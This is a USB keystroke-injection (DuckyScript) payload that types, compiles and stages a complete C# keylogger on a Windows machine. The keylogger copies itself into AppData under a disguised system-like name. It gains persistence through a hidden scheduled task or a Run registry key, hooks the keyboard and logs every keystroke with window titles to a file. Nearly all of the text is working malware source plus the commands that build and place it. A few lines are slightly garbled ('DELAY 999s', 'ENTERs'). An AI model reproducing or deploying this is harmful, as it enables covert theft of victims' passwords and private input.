REM Author: SerieuxBlack
REM Open Run dialog
DELAY 512
WINDOWS r
DELAY 512
STRING notepad
ENTER
DELAY 512
STRING using System;
ENTER
STRING using System.Diagnostics;
ENTER
STRING using System.IO;
ENTER
STRING using System.Runtime.InteropServices;
ENTER
STRING using System.Text;
ENTER
STRING using System.Windows.Forms;
ENTER
STRING using Microsoft.Win32;
ENTER
STRING using System.Security.Principal;
ENTER
STRING using System.Threading;
ENTER
STRING namespace Keyllama
ENTER
STRING {
ENTER
STRING     public static class Program
ENTER
STRING     {
ENTER
STRING         private static readonly string logLoc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\mscribe.txt";
ENTER
STRING         private static string CurrentActiveWindowTitle;
ENTER
STRING         public static class Settings
ENTER
STRING         {
ENTER
STRING             public static string InstallFolder = "AppData";
ENTER
STRING             public static string InstallFile = "mswinbscribe.exe";
ENTER
STRING         }
ENTER
STRING         public static void Install()
ENTER
STRING         {
ENTER
STRING             try
ENTER
STRING             {
ENTER
STRING                 var installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
ENTER
STRING                 var currentProcess = Process.GetCurrentProcess().MainModule.FileName;
ENTER
STRING                 if (currentProcess != installPath.FullName)
ENTER
STRING                 {
ENTER
STRING                     foreach (Process process in Process.GetProcesses())
ENTER
STRING                     {
ENTER
STRING                         try
ENTER
STRING                         {
ENTER
STRING                             if (process.MainModule.FileName == installPath.FullName)
ENTER
STRING                                 process.Kill();
ENTER
STRING                         }
ENTER
STRING                         catch { }
ENTER
STRING                     }
ENTER
STRING                     if (Alpha())
ENTER
STRING                     {
ENTER
STRING                         Process.Start(new ProcessStartInfo("cmd", "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\" /tr \"'" + installPath.FullName + "'\" & exit")
ENTER
STRING                         {
ENTER
STRING                             WindowStyle = ProcessWindowStyle.Hidden,
ENTER
STRING                             CreateNoWindow = true
ENTER
STRING                         });
ENTER
STRING                     }
ENTER
STRING                     else
ENTER
STRING                     {
ENTER
STRING                         using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true))
ENTER
STRING                         {
ENTER
STRING                             key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
ENTER
STRING                         }
ENTER
STRING                     }
ENTER
STRING                     if (File.Exists(installPath.FullName))
ENTER
STRING                     {
ENTER
STRING                         File.Delete(installPath.FullName);
ENTER
STRING                         Thread.Sleep(1000);
ENTER
STRING                     }
ENTER
STRING                     using (var fs = new FileStream(installPath.FullName, FileMode.CreateNew))
ENTER
STRING                     {
ENTER
STRING                         var clientExe = File.ReadAllBytes(currentProcess);
ENTER
STRING                         fs.Write(clientExe, 0, clientExe.Length);
ENTER
STRING                     }
ENTER
STRING                     string batch = Path.GetTempFileName() + ".bat";
ENTER
STRING                     using (var sw = new StreamWriter(batch))
ENTER
STRING                     {
ENTER
STRING                         sw.WriteLine("@echo off");
ENTER
STRING                         sw.WriteLine("timeout 3 > NUL");
ENTER
STRING                         sw.WriteLine("START \"\" \"" + installPath.FullName + "\"");
ENTER
STRING                         sw.WriteLine("CD " + Path.GetTempPath());
ENTER
STRING                         sw.WriteLine("DEL \"" + Path.GetFileName(batch) + "\" /f /q");
ENTER
STRING                     }
ENTER
STRING                     Process.Start(new ProcessStartInfo(batch) { CreateNoWindow = true, ErrorDialog = false, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
ENTER
STRING                     Environment.Exit(0);
ENTER
STRING                 }
ENTER
STRING             }
ENTER
STRING             catch (Exception ex)
ENTER
STRING             {
ENTER
STRING                 Debug.WriteLine("Install Failed : " + ex.Message);
ENTER
STRING             }
ENTER
STRING         }
ENTER
STRING         private static string ActiveWinTitle()
ENTER
STRING         {
ENTER
STRING             IntPtr hwnd = GetForegroundWindow();
ENTER
STRING             uint pid;
ENTER
STRING             GetWindowThreadProcessId(hwnd, out pid);
ENTER
STRING             try
ENTER
STRING             {
ENTER
STRING                 var process = Process.GetProcessById((int)pid);
ENTER
STRING                 CurrentActiveWindowTitle = string.IsNullOrWhiteSpace(process.MainWindowTitle) ? process.ProcessName : process.MainWindowTitle;
ENTER
STRING                 return CurrentActiveWindowTitle;
ENTER
STRING             }
ENTER
STRING             catch (Exception)
ENTER
STRING             {
ENTER
STRING                 return "woopsie, something went wrong!";
ENTER
STRING             }
ENTER
STRING         }
ENTER
STRING         private static string KeyboardLayout(uint vkCode)
ENTER
STRING         {
ENTER
STRING             try
ENTER
STRING             {
ENTER
STRING                 var vkBuffer = new byte[256];
ENTER
STRING                 if (!GetKeyboardState(vkBuffer)) return "";
ENTER
STRING                 uint processId;
ENTER
STRING                 var keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out processId));
ENTER
STRING                 var sb = new StringBuilder();
ENTER
STRING                 ToUnicodeEx(vkCode, MapVirtualKey(vkCode, 0), vkBuffer, sb, 5, 0, keyboardLayout);
ENTER
STRING                 return sb.ToString();
ENTER
STRING             }
ENTER
STRING             catch { }
ENTER
STRING             return ((Keys)vkCode).ToString();
ENTER
STRING         }
ENTER
STRING         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
ENTER
STRING         {
ENTER
STRING             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
ENTER
STRING             {
ENTER
STRING                 int vkCode = Marshal.ReadInt32(lParam);
ENTER
STRING                 bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
ENTER
STRING                 bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
ENTER
STRING                 string currentKey = KeyboardLayout((uint)vkCode);
ENTER
STRING                 currentKey = capsLock || shiftPress ? currentKey.ToUpper() : currentKey.ToLower();
ENTER
STRING                 if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
ENTER
STRING                     currentKey = "[" + ((Keys)vkCode).ToString() + "]";
ENTER
STRING                 else
ENTER
STRING                 {
ENTER
STRING                     switch (((Keys)vkCode).ToString())
ENTER
STRING                     {
ENTER
STRING                         case "Space": currentKey = "[SPACE]"; break;
ENTER
STRING                         case "Return": currentKey = "[ENTER]"; break;
ENTER
STRING                         case "Escape": currentKey = "[ESC]"; break;
ENTER
STRING                         case "LControlKey":
ENTER
STRING                         case "RControlKey": currentKey = "[CTRL]"; break;
ENTER
STRING                         case "RShiftKey":
ENTER
STRING                         case "LShiftKey": currentKey = "[Shift]"; break;
ENTER
STRING                         case "Back": currentKey = "[Back]"; break;
ENTER
STRING                         case "LWin": currentKey = "[WIN]"; break;
ENTER
STRING                         case "Tab": currentKey = "[Tab]"; break;
ENTER
STRING                         case "Capital": currentKey = capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]"; break;
ENTER
STRING                     }
ENTER
STRING                 }
ENTER
STRING                 using (StreamWriter sw = new StreamWriter(logLoc, true))
ENTER
STRING                 {
ENTER
STRING                     if (CurrentActiveWindowTitle == ActiveWinTitle())
ENTER
STRING                         sw.Write(currentKey);
ENTER
STRING                     else
ENTER
STRING                     {
ENTER
STRING                         sw.WriteLine();
ENTER
STRING                         sw.WriteLine("###  " + ActiveWinTitle() + " ###");
ENTER
STRING                         sw.Write(currentKey);
ENTER
STRING                     }
ENTER
STRING                 }
ENTER
STRING             }
ENTER
STRING             return CallNextHookEx(_hookID, nCode, wParam, lParam);
ENTER
STRING         }
ENTER
STRING         private static IntPtr SetHook(LowLevelKeyboardProc proc)
ENTER
STRING         {
ENTER
STRING             return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(Process.GetCurrentProcess().ProcessName), 0);
ENTER
STRING         }
ENTER
STRING         public static bool Alpha()
ENTER
STRING         {
ENTER
STRING             return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
ENTER
STRING         }
ENTER
STRING         public static void Main()
ENTER
STRING         {
ENTER
STRING             Install();
ENTER
STRING             _hookID = SetHook(_proc);
ENTER
STRING             Application.Run();
ENTER
STRING         }
ENTER
STRING         #region "Hooks & Native Methods"
ENTER
STRING         private const int WM_KEYDOWN = 0x0100;
ENTER
STRING         private static LowLevelKeyboardProc _proc = HookCallback;
ENTER
STRING         private static IntPtr _hookID = IntPtr.Zero;
ENTER
STRING         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
ENTER
STRING         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
ENTER
STRING         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
ENTER
STRING         [return: MarshalAs(UnmanagedType.Bool)]
ENTER
STRING         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
ENTER
STRING         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
ENTER
STRING         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
ENTER
STRING         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
ENTER
STRING         private static extern IntPtr GetModuleHandle(string lpModuleName);
ENTER
STRING         private static int WHKEYBOARDLL = 13;
ENTER
STRING         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
ENTER
STRING         [DllImport("user32.dll")]
ENTER
STRING         static extern IntPtr GetForegroundWindow();
ENTER
STRING         [DllImport("user32.dll", SetLastError = true)]
ENTER
STRING         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
ENTER
STRING         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
ENTER
STRING         public static extern short GetKeyState(int keyCode);
ENTER
STRING         [DllImport("user32.dll", SetLastError = true)]
ENTER
STRING         [return: MarshalAs(UnmanagedType.Bool)]
ENTER
STRING         static extern bool GetKeyboardState(byte[] lpKeyState);
ENTER
STRING         [DllImport("user32.dll")]
ENTER
STRING         static extern IntPtr GetKeyboardLayout(uint idThread);
ENTER
STRING         [DllImport("user32.dll")]
ENTER
STRING         static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
ENTER
STRING         [DllImport("user32.dll")]
ENTER
STRING         static extern uint MapVirtualKey(uint uCode, uint uMapType);
ENTER
STRING         #endregion
ENTER
STRING     }
ENTER
STRING }
ENTER
REM Save the file with a unique name in the default directory
DELAY 512
CTRL s
DELAY 512
STRING Keyllama.cs
ENTER
DELAY 512
ALT F4
DELAY 512
REM Open PowerShell
WINDOWS r
DELAY 512
STRING powershell
ENTER
DELAY 999
REM find the file
STRING $fp = gci -Path C:\ -rec -ea SilentlyContinue -Filter Keyllama.cs | select -ExpandProperty FullName -First 1
ENTER
DELAY 999
REM Display the contents of the file
STRING Get-Content $fp
ENTER
REM Compile Time >:)
STRING & 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe' /out:Yahvehcaller.exe $fp
ENTER
DELAY 999s
REM Identify the path of Yahvehcaller.exe and move it
STRING $erieux = Join-Path (Split-Path $fp) 'Yahvehcaller.exe'
ENTERs
STRING $BLACK = [Environment]::GetFolderPath([Environment+SpecialFolder]::ApplicationData)
ENTER
STRING Move-Item $erieux $BLACK
ENTER
DELAY 999
REM Execute
REM Start-Process -FilePath $destination -WindowStyle Hidden
REM [ENTER]